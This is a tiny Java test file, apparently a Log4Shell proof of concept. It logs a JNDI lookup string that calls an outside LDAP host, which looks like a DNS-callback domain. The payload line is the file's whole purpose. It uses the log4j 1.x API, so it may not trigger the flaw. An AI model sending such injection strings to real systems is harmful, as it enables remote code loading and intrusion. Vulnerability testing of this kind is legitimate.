package log4j;

//import com.sun.org.slf4j.internal.Logger;
//import com.sun.org.slf4j.internal.LoggerFactory;
//import org.slf4j.Logger;
//import org.slf4j.LoggerFactory;
import org.apache.log4j.Logger;
public class Log4jTest {

    private static final Logger log = Logger.getLogger(Log4jTest.class);

    public static void main(String[] args){
        Log4jTest log4jTest=new Log4jTest();

        log.info("${jndi:ldap://t00ls.460c0651.tu4.org/wu_suo_wei}");
    }

}
